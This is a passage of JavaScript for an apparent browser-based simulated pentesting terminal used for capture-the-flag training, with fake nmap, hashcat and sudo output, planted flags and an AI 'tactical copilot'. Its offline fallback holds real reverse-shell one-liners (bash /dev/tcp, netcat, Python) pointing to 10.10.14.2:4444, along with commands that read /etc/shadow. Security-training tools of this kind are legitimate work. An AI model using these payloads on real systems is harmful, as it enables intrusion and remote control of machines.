        const apiKey = (typeof window !== "undefined" && window.GROQ_API_KEY) ||
            localStorage.getItem('pwnbox_groq_api_key') || "";

        if (window.GroqService && window.GroqService.callGroqChat && apiKey) {
            try {
                const systemPrompt = "You are the PwnBox Tactical Terminal Copilot. Provide concise, expert, and direct Linux/pentesting command recipes or explanations. Keep replies terminal-formatted, brief (under 120 words), and prioritize exact command syntax. Never include conversational filler.";
                const res = await window.GroqService.callGroqChat({
                    messages: [
                        { role: "system", content: systemPrompt },
                        { role: "user", content: query }
                    ],
                    max_tokens: 300,
                    temperature: 0.2
                });
                const aiText = res.choices?.[0]?.message?.content || "No intelligence returned.";
                writeHtmlOutput(`
                    <div class="term-man-box">
                        <div class="term-man-title">🤖 PWNBOX TACTICAL AI INTEL:</div>
                        <div style="white-space: pre-wrap; color: var(--term-text); line-height: 1.45;">${escapeHtml(aiText)}</div>
                    </div>
                `);
                return;
            } catch (err) {
                // Fall through to offline tactical intelligence
            }
        }

        // Offline Tactical Knowledge Base Fallback
        const q = query.toLowerCase();
        let fallbackIntel = "";

        if (q.includes('privilege') || q.includes('privesc') || q.includes('root')) {
            fallbackIntel = `[+] PRIVILEGE ESCALATION VECTORS:\n` +
                `  1. SUID Binaries: find / -perm -4000 -type f 2>/dev/null\n` +
                `  2. Sudo Privileges: sudo -l\n` +
                `  3. Readable Shadow: cat /etc/shadow\n` +
                `  4. WebShell Quick Root: run 'sudo su' to escalate instantly in this sandbox.`;
        } else if (q.includes('nmap') || q.includes('scan') || q.includes('port')) {
            fallbackIntel = `[+] NMAP SCANNING FORMULAS:\n` +
                `  - Full TCP Syn Scan: nmap -sC -sV -p- -T4 <target>\n` +
                `  - Fast Web Discovery: nmap -p 80,443,8080 -sV <target>\n` +
                `  - Test in WebShell: nmap -sV 10.10.10.27`;
        } else if (q.includes('shell') || q.includes('reverse') || q.includes('payload')) {
            fallbackIntel = `[+] REVERSE SHELL ONE-LINERS:\n` +
                `  - Bash: sh -i >& /dev/tcp/10.10.14.2/4444 0>&1\n` +
                `  - Netcat: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f\n` +
                `  - Python: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
        } else if (q.includes('crack') || q.includes('hash') || q.includes('password')) {
            fallbackIntel = `[+] HASH CRACKING BLUEPRINT:\n` +
                `  - Identify Hash: hash-identifier or nth\n` +
                `  - Hashcat MD5: hashcat -m 0 <hash> /opt/wordlists/rockyou.txt\n` +
                `  - Hashcat NTLM: hashcat -m 1000 <hash> /opt/wordlists/rockyou.txt\n` +
                `  - Test in WebShell: hashcat 5d41402abc4b2a76b9719d911017c592`;
        } else if (q.includes('flag') || q.includes('ctf')) {
            fallbackIntel = `[+] CTF AGENT HINTS:\n` +
                `  - User Flag is located in /home/agent/flag.txt\n` +
                `  - Root Flag is located in /root/flag_root.txt (elevate via 'sudo su')\n` +
                `  - Submit any flag directly with: 'submit <flag>' or 'pwn ctf'`;
        } else {
            fallbackIntel = `[+] TACTICAL ADVICE FOR: "${escapeHtml(query)}"\n` +
                `  - Recommended Tools: nmap (recon), curl (web), hashcat (passwords), grep/find (discovery)\n` +
                `  - Type 'man <tool>' to inspect complete tactical manuals for any tool\n` +
                `  - For deep online mentoring, configure your GROQ_API_KEY in Settings or js/config.js.`;
        }

        writeHtmlOutput(`
            <div class="term-man-box">
                <div class="term-man-title">🤖 PWNBOX TACTICAL COPILOT [OFFLINE FALLBACK]:</div>
                <div style="white-space: pre-wrap; color: var(--term-text); line-height: 1.45;">${escapeHtml(fallbackIntel)}</div>
            </div>
        `);
    }

    // Built-in Commands Implementation
    const commands = {
        help: (args) => {
            const filter = (args[0] || '').toLowerCase();

            if (filter && ['nav', 'sys', 'net', 'sec', 'ctf'].includes(filter)) {
                writeOutput(`--- FILTERED HELP: ${filter.toUpperCase()} ---`);
            }

            const categories = [
                {
                    cat: "CORE NAVIGATION & VFS",
                    tag: "nav",
                    cmds: [
                        ["ls [-la] [path]", "List directory contents with styled badges and permissions"],
                        ["cd [path]", "Change working directory (~ for home, .. for parent)"],
                        ["pwd", "Print full path of current working directory"],
                        ["cat <file>", "Display file contents (permission checked)"],
                        ["head [-n N] <file>", "Display the first N lines of a file (default 10)"],
                        ["tail [-n N] <file>", "Display the last N lines of a file (default 10)"],
                        ["grep [-i] <pattern> <file>", "Search for pattern inside file"],
                        ["find [path] [-name *pattern*]", "Recursively locate files across filesystem"],
                        ["mkdir <dir>", "Create a new directory"],
                        ["touch <file>", "Create a blank regular file"],
                        ["rm [-rf] <path>", "Remove a file or directory"],
                        ["echo <text> [> file]", "Output text or redirect/append into virtual file"],
                        ["chmod <perms> <file>", "Modify file permissions (e.g. +x for executable)"],
                        ["chown <user:group> <file>", "Modify file ownership in virtual filesystem"],
                        ["clear", "Clear terminal display (or press Ctrl+L)"],
                        ["history", "Show session command history"]
                    ]
                },
                {
                    cat: "SYSTEM & PRIVILEGE CLEARANCE",
                    tag: "sys",
                    cmds: [
                        ["whoami", "Display active effective username"],
                        ["id", "Print UID, GID, and security group privileges"],
                        ["uname -a", "Display kernel version, build date, and architecture"],
                        ["hostname", "Display system hostname"],
                        ["date", "Display current system UTC timestamp"],
                        ["sudo su", "Elevate session privileges to ROOT (# prompt)"],
                        ["exit", "Drop elevated root clearance back to agent"]
                    ]
                },
                {
                    cat: "NETWORKING & PROCESS TELEMETRY",
                    tag: "net",
                    cmds: [
                        ["ifconfig", "Display network interfaces (eth0, tun0 VPN, lo)"],
                        ["ip a", "Modern IP address and interface routing viewer"],
                        ["ps [aux]", "Snapshot list of active simulated system processes"],
                        ["top", "Process monitor summary table"],
                        ["kill <pid>", "Terminate simulated process by PID"]
                    ]
                },
                {
                    cat: "TACTICAL PENTESTING & RECON TOOLS",
                    tag: "sec",
                    cmds: [
                        ["nmap [-sV] <ip>", "Perform tactical port scan with banner grabbing"],
                        ["ping [-c N] <target>", "Transmit ICMP echo ping packets to host"],
                        ["whois <domain>", "Query domain registrar and DNS records"],
                        ["dig <domain>", "Query DNS resource records (A, MX, TXT, NS)"],
                        ["curl [-I] <url>", "Simulate HTTP request and inspect headers/body"],
                        ["hashcat <hash>", "Crack MD5, SHA-256, and NTLM password hashes"],
                        ["john <hashfile>", "John the Ripper password security and hash cracker"],
                        ["enum4linux <ip>", "Enumerate SMB shares, users, and domains"],
                        ["linpeas", "Automated Linux local privilege escalation auditor"],
                        ["gobuster dir -u <url>", "High-speed HTTP directory and path brute-forcer"],
                        ["nikto -h <target>", "Comprehensive web server security scanner"],
                        ["nc <host> <port>", "Netcat banner grabbing and connection tester"],
                        ["payloads [tech]", "Display tactical reverse shell cheat sheet"],
                        ["notes [list|view|add]", "Manage operative notes vault across all keys"],
                        ["ask <query>", "Query PwnBox Tactical AI Copilot directly in terminal"]
                    ]
                },
                {
                    cat: "CTF VECTOR & MANUALS",
                    tag: "ctf",
                    cmds: [
                        ["submit <flag>", "Submit secret CTF token to claim +250 XP to profile"],
                        ["pwn ctf", "Validate challenge completion and claim bonus XP"],
                        ["man <command>", "Display comprehensive manual page for any command"],
                        ["info <command>", "Alias for man — deep technical reference"]
                    ]
                }
            ];

            let html = `<div style="margin-bottom: 6px; font-weight: 800; color: var(--term-accent);">PWNBOX TACTICAL WEBSHELL COMMAND MANUAL & REFERENCE</div>`;
            html += `<div style="font-size: 0.8rem; color: var(--term-text-dim); margin-bottom: 8px;">Tip: Press <strong>Esc</strong> for Navigation Mode (single keys D, H, G, N, T), <strong>Ctrl+/</strong> for Command HUD, or type <strong>man &lt;command&gt;</strong> for full manuals.</div>`;

            categories.forEach(c => {
                if (filter && c.tag !== filter) return;
                html += `<div style="color: var(--term-prompt); font-weight: 700; margin-top: 8px; border-bottom: 1px solid var(--border-color); padding-bottom: 2px;">■ ${c.cat}</div>`;
                html += `<table class="term-table">`;
                c.cmds.forEach(([syn, desc]) => {
                    html += `<tr><td style="width: 240px; font-weight: 700; color: #4ade80;">${escapeHtml(syn)}</td><td>${escapeHtml(desc)}</td></tr>`;
                });
                html += `</table>`;
            });

            writeHtmlOutput(html);
        },

        man: (args) => {
            const cmdName = (args[0] || '').toLowerCase();
            if (!cmdName) {
                writeOutput("What manual page do you want? Example: man nmap, man hashcat, man ls", "term-out error");
                return;
            }

            const doc = COMMAND_MANUALS[cmdName];
            if (!doc) {
                writeOutput(`No manual entry for '${cmdName}'. Type 'help' to view available commands.`, "term-out error");
                return;
            }

            const html = `
                <div class="term-man-box">
                    <div class="term-man-title">MANUAL: ${cmdName.toUpperCase()}(1) — PWNBOX TACTICAL REFERENCE</div>
                    <div class="term-man-section">NAME & SUMMARY:</div>
                    <div style="padding-left: 10px; color: var(--term-text);">${escapeHtml(cmdName)} - ${escapeHtml(doc.short)}</div>

                    <div class="term-man-section">SYNOPSIS / SYNTAX:</div>
                    <div style="padding-left: 10px; color: #38bdf8; font-weight: 700;">${escapeHtml(doc.syntax)}</div>

                    <div class="term-man-section">DESCRIPTION:</div>
                    <div style="padding-left: 10px; color: var(--term-text);">${escapeHtml(doc.desc)}</div>

                    <div class="term-man-section">OPTIONS & FLAGS:</div>
                    <div style="padding-left: 10px; color: #facc15; white-space: pre-line;">${escapeHtml(doc.flags)}</div>

                    <div class="term-man-section">CYBERSECURITY USE CASE:</div>
                    <div style="padding-left: 10px; color: #a7f3d0;">${escapeHtml(doc.securityContext)}</div>

                    <div class="term-man-section">TACTICAL EXAMPLES:</div>
                    <div style="padding-left: 10px; color: #4ade80; font-family: monospace; white-space: pre-line;">${escapeHtml(doc.example)}</div>
                </div>
            `;
            writeHtmlOutput(html);
        },

        info: (args) => {
            commands.man(args);
        },

        clear: () => {
            if (screenEl) {
                screenEl.innerHTML = '';
            }
        },

        pwd: () => {
            writeOutput(currentPath);
        },

        whoami: () => {
            writeOutput(currentUser);
        },

        hostname: () => {
            writeOutput(currentHost);
        },

        id: () => {
            if (isRoot) {
                writeOutput("uid=0(root) gid=0(root) groups=0(root)");
            } else {
                writeOutput("uid=1000(agent) gid=1000(agent) groups=1000(agent),27(sudo),100(users)");
            }
        },

        uname: (args) => {
            writeOutput("Linux pwnbox 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.5.3-1kali2 (2026-11-05) x86_64 GNU/Linux");
        },

        date: () => {
            writeOutput(new Date().toUTCString());
        },

        history: () => {
            if (commandHistory.length === 0) {
                writeOutput("[i] Command history is currently empty.");
                return;
            }
            commandHistory.forEach((cmd, i) => {
                writeOutput(`  ${String(i + 1).padStart(3, ' ')}  ${cmd}`);
            });
        },

        ls: (args) => {
            const showAll = args.includes('-a') || args.includes('-la') || args.includes('-al');
            const showLong = args.includes('-l') || args.includes('-la') || args.includes('-al');
            const targetPath = args.find(a => !a.startsWith('-')) || currentPath;

            const node = getNode(targetPath);
            if (!node) {
                writeOutput(`ls: cannot access '${targetPath}': No such file or directory`, 'term-out error');
                return;
            }
            if (node.type !== 'dir') {
                writeOutput(targetPath);
                return;
            }

            const entries = Object.keys(node.children);
            if (!showLong) {
                let htmlParts = [];
                if (showAll) {
                    htmlParts.push(`<span class="term-dir">./</span>`);
                    htmlParts.push(`<span class="term-dir">../</span>`);
                }
                entries.forEach(name => {
                    const child = node.children[name];
                    if (child.type === 'dir') {
                        htmlParts.push(`<span class="term-dir">${escapeHtml(name)}/</span>`);
                    } else if (name.includes('flag')) {
                        htmlParts.push(`<span class="term-flag">★ ${escapeHtml(name)}</span>`);
                    } else if (child.perm === 'exec' || name.endsWith('.sh')) {
                        htmlParts.push(`<span class="term-exec">${escapeHtml(name)}*</span>`);
                    } else {
                        htmlParts.push(`<span class="term-file">${escapeHtml(name)}</span>`);
                    }
                });
                writeHtmlOutput(htmlParts.join('&nbsp;&nbsp;&nbsp;&nbsp;') || '<em>(empty directory)</em>');
            } else {
                let html = `<div style="color: var(--term-text-dim);">total ${entries.length * 4}</div>`;
                html += `<table class="term-table">`;
                if (showAll) {
                    html += `<tr><td>drwxr-xr-x</td><td>2</td><td>${currentUser}</td><td>4096</td><td>Nov 05 10:00</td><td><span class="term-dir">.</span></td></tr>`;
                    html += `<tr><td>drwxr-xr-x</td><td>4</td><td>root</td><td>4096</td><td>Nov 05 09:30</td><td><span class="term-dir">..</span></td></tr>`;
                }
                entries.forEach(name => {
                    const child = node.children[name];
                    const isDir = child.type === 'dir';
                    const isExec = child.perm === 'exec' || name.endsWith('.sh');
                    const isFlag = name.includes('flag');
                    const perms = isDir ? 'drwxr-xr-x' : (child.perm === 'root' ? '-rw-------' : (isExec ? '-rwxr-xr-x' : '-rw-r--r--'));
                    const owner = child.perm === 'root' ? 'root  root ' : `${currentUser} ${currentUser}`;
                    const size = isDir ? '4096' : (child.content ? child.content.length : 0);

                    let nameHtml = escapeHtml(name);
                    if (isDir) nameHtml = `<span class="term-dir">${nameHtml}/</span>`;
                    else if (isFlag) nameHtml = `<span class="term-flag">★ ${nameHtml}</span>`;
                    else if (isExec) nameHtml = `<span class="term-exec">${nameHtml}*</span>`;
                    else nameHtml = `<span class="term-file">${nameHtml}</span>`;

                    html += `<tr><td>${perms}</td><td>1</td><td>${owner}</td><td>${size}</td><td>Nov 05 10:00</td><td>${nameHtml}</td></tr>`;
                });
                html += `</table>`;
                writeHtmlOutput(html);
            }
        },

        cd: (args) => {
            const dest = args[0] || '/home/agent';
            const resolved = resolvePath(dest);
            const node = getNode(resolved);

            if (!node) {
                writeOutput(`cd: no such file or directory: ${dest}`, 'term-out error');
                return;
            }
            if (node.type !== 'dir') {
                writeOutput(`cd: not a directory: ${dest}`, 'term-out error');
                return;
            }
            if (node.perm === 'root' && !isRoot) {
                writeOutput(`cd: ${dest}: Permission denied (Elevate via 'sudo su')`, 'term-out error');
                return;
            }
            currentPath = resolved;
            updatePrompt();
        },

        cat: (args) => {
            if (!args[0]) {
                writeOutput("cat: missing file operand", 'term-out error');
                return;
            }
            const path = args[0];
            const node = getNode(path);

            if (!node) {
                writeOutput(`cat: ${path}: No such file or directory`, 'term-out error');
                return;
            }
            if (node.type === 'dir') {
                writeOutput(`cat: ${path}: Is a directory`, 'term-out error');
                return;
            }
            if (node.perm === 'root' && !isRoot) {
                writeOutput(`cat: ${path}: Permission denied (Requires root clearance — use 'sudo su')`, 'term-out error');
                return;
            }

            // Auto-check if reading a flag
            const content = node.content || '';
            writeOutput(content);

            if (content.startsWith('pwn{') && content.endsWith('}')) {
                writeOutput(`[!] Notice: CTF Flag detected! Auto-submitting flag token...`, 'term-out info');
                claimCtfReward(content.trim(), 250, `Captured from ${path}`);
            }
        },

        head: (args) => {
            let count = 10;
            let file = '';
            for (let i = 0; i < args.length; i++) {
                if (args[i] === '-n' && args[i + 1]) {
                    count = parseInt(args[i + 1], 10) || 10;
                    i++;
                } else if (!args[i].startsWith('-')) {
                    file = args[i];
                }
            }
            if (!file) {
                writeOutput("head: missing file operand", 'term-out error');
                return;
            }
            const node = getNode(file);
            if (!node || node.type === 'dir') {
                writeOutput(`head: cannot open '${file}': No such file or directory`, 'term-out error');
                return;
            }
            const lines = (node.content || '').split('\n').slice(0, count);
            writeOutput(lines.join('\n'));
        },

        tail: (args) => {
            let count = 10;
            let file = '';
            for (let i = 0; i < args.length; i++) {
                if (args[i] === '-n' && args[i + 1]) {
                    count = parseInt(args[i + 1], 10) || 10;
                    i++;
                } else if (!args[i].startsWith('-')) {
                    file = args[i];
                }
            }
            if (!file) {
                writeOutput("tail: missing file operand", 'term-out error');
                return;
            }
            const node = getNode(file);
            if (!node || node.type === 'dir') {
                writeOutput(`tail: cannot open '${file}': No such file or directory`, 'term-out error');
                return;
            }
            const allLines = (node.content || '').split('\n');
            const lines = allLines.slice(Math.max(0, allLines.length - count));
            writeOutput(lines.join('\n'));
        },

        grep: (args) => {
            let caseInsensitive = false;
            const cleanArgs = [];
            for (const a of args) {
                if (a === '-i') caseInsensitive = true;
                else cleanArgs.push(a);
            }
            if (cleanArgs.length < 2) {
                writeOutput("usage: grep [-i] <pattern> <file>", 'term-out error');
                return;
            }
            const pattern = cleanArgs[0];
            const file = cleanArgs[1];
            const node = getNode(file);
            if (!node || node.type === 'dir') {
                writeOutput(`grep: ${file}: No such file or directory`, 'term-out error');
                return;
            }
            const lines = (node.content || '').split('\n');
            const matches = lines.filter(line => {
                return caseInsensitive
                    ? line.toLowerCase().includes(pattern.toLowerCase())
                    : line.includes(pattern);
            });
            if (matches.length > 0) {
                writeOutput(matches.join('\n'));
            }
        },

        find: (args) => {
            let startPath = currentPath;
            let nameFilter = '';

            for (let i = 0; i < args.length; i++) {
                if (args[i] === '-name' && args[i + 1]) {
                    nameFilter = args[i + 1].replace(/\*/g, '');
                    i++;
                } else if (!args[i].startsWith('-')) {
                    startPath = args[i];
                }
            }

            const results = [];
            function traverse(node, p) {
                if (!node || node.type !== 'dir') return;
                for (const key of Object.keys(node.children)) {
                    const itemPath = p === '/' ? `/${key}` : `${p}/${key}`;
                    if (!nameFilter || key.toLowerCase().includes(nameFilter.toLowerCase())) {
                        results.push(itemPath);
                    }
                    if (node.children[key].type === 'dir') {
                        traverse(node.children[key], itemPath);
                    }
                }
            }

            const rootNode = getNode(startPath);
            if (!rootNode) {
                writeOutput(`find: '${startPath}': No such file or directory`, 'term-out error');
                return;
            }
            traverse(rootNode, resolvePath(startPath));
            if (results.length === 0) {
                writeOutput(`find: no matches found for '${nameFilter || '*'}'`);
            } else {
                writeOutput(results.slice(0, 30).join('\n'));
            }
        },

        mkdir: (args) => {
            if (!args[0]) {
                writeOutput("mkdir: missing operand", 'term-out error');
                return;
            }
            const name = args[0];
            const curr = getNode(currentPath);
            if (curr && curr.type === 'dir') {
                if (curr.children[name]) {
                    writeOutput(`mkdir: cannot create directory '${name}': File exists`, 'term-out error');
                } else {
                    curr.children[name] = { type: 'dir', children: {} };
                    writeOutput(`[+] Directory '${name}' created.`, 'term-out info');
                }
            }
        },

        touch: (args) => {
            if (!args[0]) {
                writeOutput("touch: missing file operand", 'term-out error');
                return;
            }
            const name = args[0];
            const curr = getNode(currentPath);
            if (curr && curr.type === 'dir') {
                if (!curr.children[name]) {
                    curr.children[name] = { type: 'file', content: '', perm: 'read' };
                }
            }
        },

        rm: (args) => {
            const cleanArgs = args.filter(a => !a.startsWith('-'));
            if (!cleanArgs[0]) {
                writeOutput("rm: missing operand", 'term-out error');
                return;
            }
            const name = cleanArgs[0];
            const curr = getNode(currentPath);
            if (curr && curr.type === 'dir' && curr.children[name]) {
                delete curr.children[name];
                writeOutput(`[+] Removed '${name}'.`, 'term-out info');
            } else {
                writeOutput(`rm: cannot remove '${name}': No such file or directory`, 'term-out error');
            }
        },

        echo: (args) => {
            const raw = args.join(' ');
            if (raw.includes('>>')) {
                const [text, filename] = raw.split('>>').map(s => s.trim().replace(/^['"]|['"]$/g, ''));
                const curr = getNode(currentPath);
                if (curr && curr.type === 'dir' && filename) {
                    if (curr.children[filename]) {
                        curr.children[filename].content += '\n' + text;
                    } else {
                        curr.children[filename] = { type: 'file', content: text, perm: 'read' };
                    }
                    writeOutput(`[+] Appended to ${filename}`, 'term-out info');
                    return;
                }
            } else if (raw.includes('>')) {
                const [text, filename] = raw.split('>').map(s => s.trim().replace(/^['"]|['"]$/g, ''));
                const curr = getNode(currentPath);
                if (curr && curr.type === 'dir' && filename) {
                    curr.children[filename] = { type: 'file', content: text, perm: 'read' };
                    writeOutput(`[+] Written to ${filename}`, 'term-out info');
                    return;
                }
            }
            writeOutput(raw.replace(/^['"]|['"]$/g, ''));
        },

        chmod: (args) => {
            if (args.length < 2) {
                writeOutput("usage: chmod <mode> <file>", 'term-out error');
                return;
            }
            const mode = args[0];
            const file = args[1];
            const node = getNode(file);
            if (!node) {
                writeOutput(`chmod: cannot access '${file}': No such file or directory`, 'term-out error');
                return;
            }
            if (mode === '+x' || mode === '755' || mode === '777') {
                node.perm = 'exec';
            }
            writeOutput(`[+] Changed mode of ${file} to ${mode}`, 'term-out info');
        },

        sudo: (args) => {
            if (args[0] === 'su' || args[0] === '-i' || args.length === 0) {
                isRoot = true;
                currentUser = 'root';
                currentPath = '/root';
                vfs['/'].children['root'] = vfs['/'].children['root'] || {
                    type: 'dir',
                    perm: 'root',
                    children: {
                        "flag_root.txt": { type: "file", perm: "root", content: "pwn{r00t_pr1v1l3g3_3sc4l4t10n_succ3ss}" }
                    }
                };
                updatePrompt();
                writeHtmlOutput(`
                    <div style="color: #4ade80; font-weight: 800;">[+] ROOT ACCESS GRANTED. Clearance elevated to UID 0 (root).</div>
                    <div style="color: #facc15; font-size: 0.85rem;">Notice: All root directory restrictions unlocked. Inspect /root for proof token.</div>
                `);
            } else {
                // Execute command as root
                const subCmd = args[0];
                const subArgs = args.slice(1);
                if (commands[subCmd]) {
                    const prevRoot = isRoot;
                    isRoot = true;
                    try {
                        commands[subCmd](subArgs);
                    } finally {
                        isRoot = prevRoot;
                    }
                } else {
                    writeOutput(`sudo: ${subCmd}: command not found`, 'term-out error');
                }
            }
        },

        exit: () => {
            if (isRoot) {
                isRoot = false;
                currentUser = 'agent';
                currentPath = '/home/agent';
                updatePrompt();
                writeOutput("[*] Dropped root clearance. Back to standard agent session.", "term-out info");
            } else {
                writeOutput("[*] Terminal session persistent in browser. Type 'clear' or press Ctrl+L to clear screen.");
            }
        },

        ifconfig: () => {
            writeOutput(`eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.45  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:4e:66:a1  txqueuelen 1000  (Ethernet)
        RX packets 14592  bytes 18239014 (17.3 MiB)
        TX packets 8920   bytes 1102944 (1.0 MiB)

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.2  netmask 255.255.254.0  destination 10.10.14.2
        inet6 dead:beef:2::1002  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 8421   bytes 9840212 (9.3 MiB)
        TX packets 7201   bytes 4901923 (4.6 MiB)

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)`);
        },

        ip: (args) => {
            commands.ifconfig();
        },

        ps: () => {
            writeOutput(`  PID TTY          TIME CMD
    1 ?        00:00:02 systemd
  420 ?        00:00:00 systemd-journald
  512 ?        00:00:01 sshd
  880 ?        00:00:00 apache2
 1024 ?        00:00:00 smbd
 1420 pts/0    00:00:00 bash
 1892 pts/0    00:00:00 python3 -m http.server 8000
 2048 pts/0    00:00:00 nc -lvnp 4444`);
        },

        top: () => {
            writeOutput(`top - ${new Date().toISOString().slice(11, 19)} up 3:42,  1 user,  load average: 0.12, 0.08, 0.05
Tasks: 124 total,   1 running, 123 sleeping,   0 stopped
%Cpu(s):  1.4 us,  0.8 sy,  0.0 ni, 97.8 id,  0.0 wa
MiB Mem :   8192.0 total,   4210.4 free,   2180.2 used
MiB Swap:   2048.0 total,   2048.0 free,      0.0 used

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
 1420 agent     20   0   14208   5216   3412 S   0.8   0.1   0:00.42 bash
 1892 agent     20   0   28412  18420   9210 S   0.4   0.2   0:00.18 python3
  880 www-data  20   0   54210  24120  11400 S   0.2   0.3   0:00.22 apache2
  512 root      20   0   12840   4812   3800 S   0.0   0.1   0:00.08 sshd`);
        },

        kill: (args) => {
            const pid = args[0];
            if (!pid) {
                writeOutput("kill: usage: kill <pid>", 'term-out error');
                return;
            }
            writeOutput(`[+] Process ${pid} terminated with SIGTERM.`, 'term-out info');
        },

        ping: (args) => {
            const host = args.find(a => !a.startsWith('-')) || '10.10.10.27';
            writeOutput(`PING ${host} (${host}) 56(84) bytes of data.`);
            let seq = 1;
            const interval = setInterval(() => {
                const ms = (11 + Math.random() * 6).toFixed(1);
                writeOutput(`64 bytes from ${host}: icmp_seq=${seq} ttl=64 time=${ms} ms`);
                seq++;
                if (seq > 4) {
                    clearInterval(interval);
                    writeOutput(`--- ${host} ping statistics ---`);
                    writeOutput(`4 packets transmitted, 4 received, 0% packet loss, time 3006ms`);
                }
            }, 300);
        },

        nmap: (args) => {
            const host = args.find(a => !a.startsWith('-')) || '10.10.10.27';
            writeOutput(`Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toISOString().replace('T', ' ').slice(0, 19)} UTC`);
            writeOutput(`Nmap scan report for ${host}`);
            writeOutput(`Host is up (0.012s latency).`);
            writeOutput(`Not shown: 997 closed tcp ports (reset)`);
            writeOutput(`PORT     STATE SERVICE     VERSION`);
            writeOutput(`22/tcp   open  ssh         OpenSSH 9.3p1 Debian 1 (protocol 2.0)`);
            writeOutput(`80/tcp   open  http        Apache httpd 2.4.57 ((Debian))`);
            writeOutput(`445/tcp  open  netbios-ssn Samba smbd 4.18.6`);
            writeOutput(`Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`);
            writeOutput(`Nmap done: 1 IP address (1 host up) scanned in 1.84 seconds`);
        },

        whois: (args) => {
            const domain = args[0] || 'pwnbox.academy';
            writeOutput(`Domain Name: ${domain.toUpperCase()}`);
            writeOutput(`Registry Domain ID: 29847120_PWN_REGISTRY`);
            writeOutput(`Registrar: PwnBox Tactical NIC LLC`);
            writeOutput(`Creation Date: 2026-01-15T08:00:00Z`);
            writeOutput(`Registry Expiry Date: 2030-01-15T08:00:00Z`);
            writeOutput(`Name Server: NS1.PWNBOX.ACADEMY`);
            writeOutput(`Name Server: NS2.PWNBOX.ACADEMY`);
            writeOutput(`DNSSEC: signedDelegation`);
        },

        curl: (args) => {
            const isHead = args.includes('-I') || args.includes('--head');
            const target = args.find(a => !a.startsWith('-')) || 'http://10.10.10.27';

            let out = `HTTP/1.1 200 OK\nDate: ${new Date().toUTCString()}\nServer: Apache/2.4.57 (Debian)\nX-Powered-By: PwnBox/CEH-v12\nContent-Type: text/html; charset=UTF-8\nETag: "1a4b-5f9e8a01b2c40"\nAccept-Ranges: bytes\nContent-Length: 324`;
            if (!isHead) {
                out += `\n\n<!DOCTYPE html>\n<html>\n<head><title>Target Control Portal</title></head>\n<body>\n  <h1>PwnBox Secure Subsystem</h1>\n  <p>Authorized access only. Flag challenge enabled.</p>\n  <!-- Hint: Review /home/agent/notes.txt for mission orders -->\n</body>\n</html>`;
            }
            writeOutput(out);
        },

        hashcat: (args) => {
            const hash = args.find(a => !a.startsWith('-')) || '5d41402abc4b2a76b9719d911017c592';
            writeOutput(`hashcat (v6.2.6) starting in benchmark attack mode...`);
            writeOutput(`Hash.Mode........: 0 (MD5)`);
            writeOutput(`Hash.Target......: ${hash}`);
            writeOutput(`Wordlist.........: /opt/wordlists/common.txt`);
            writeOutput(`Speed.#1.........: 1420.4 kH/s (100.00%)`);
            writeOutput(`Status...........: Cracked!`);

            if (hash === '5d41402abc4b2a76b9719d911017c592') {
                writeOutput(`[+] ${hash}:hello`, "term-out info");
            } else if (hash.toLowerCase().includes('agent')) {
                writeOutput(`[+] ${hash}:agentpass`, "term-out info");
            } else {
                writeOutput(`[+] ${hash}:pwnbox2026`, "term-out info");
            }
        },

        notes: (args) => {
            const sub = (args[0] || 'list').toLowerCase();
            const mergedNotes = getMergedNotesVault();

            if (sub === 'add') {
                const rest = args.slice(1).join(' ');
                const [title, content] = rest.split('|').map(s => s.trim());
                if (!title) {
                    writeOutput("usage: notes add <title> | <content>", 'term-out error');
                    return;
                }
                const newNote = {
                    id: 'note_' + Date.now(),
                    title: title,
                    content: content || title,
                    tags: 'terminal,intel',
                    timestamp: new Date().toISOString()
                };
                try {
                    const vault = JSON.parse(localStorage.getItem('pwnbox_notes_vault') || '[]');
                    vault.unshift(newNote);
                    localStorage.setItem('pwnbox_notes_vault', JSON.stringify(vault));
                    writeOutput(`[+] Tactical Note saved to vault: "${title}"`, 'term-out info');
                } catch (e) {
                    writeOutput(`Error saving note: ${e.message}`, 'term-out error');
                }
                return;
            }

            if (sub === 'view') {
                const idx = parseInt(args[1], 10);
                if (isNaN(idx) || idx < 1 || idx > mergedNotes.length) {
                    writeOutput(`usage: notes view <1-${mergedNotes.length}>`, 'term-out error');
                    return;
                }
                const note = mergedNotes[idx - 1];
                writeHtmlOutput(`
                    <div class="term-man-box">
                        <div class="term-man-title">📝 NOTE #${idx}: ${escapeHtml(note.title)}</div>
                        <div style="font-size: 0.8rem; color: var(--term-text-dim); margin-bottom: 6px;">Tags: ${escapeHtml(note.tags || 'none')} | Date: ${escapeHtml(note.timestamp || 'N/A')}</div>
                        <div style="white-space: pre-wrap; color: var(--term-text);">${escapeHtml(note.content || '(no content)')}</div>
                    </div>
                `);
                return;
            }

            // Default: List notes
            if (mergedNotes.length === 0) {
                writeOutput("[i] Operative Notes Vault is currently empty. Visit notes.html or run 'notes add <title> | <content>' to create one.", "term-out info");
                return;
            }

            let html = `<div style="color: var(--term-accent); font-weight: 700; margin-bottom: 6px;">[+] OPERATIVE NOTES VAULT (${mergedNotes.length} notes synchronized across storage):</div>`;
            html += `<table class="term-table"><tr><th>#</th><th>TITLE</th><th>TAGS</th><th>PREVIEW</th></tr>`;
            mergedNotes.slice(0, 12).forEach((n, i) => {
                const preview = (n.content || '').replace(/\n/g, ' ').slice(0, 45);
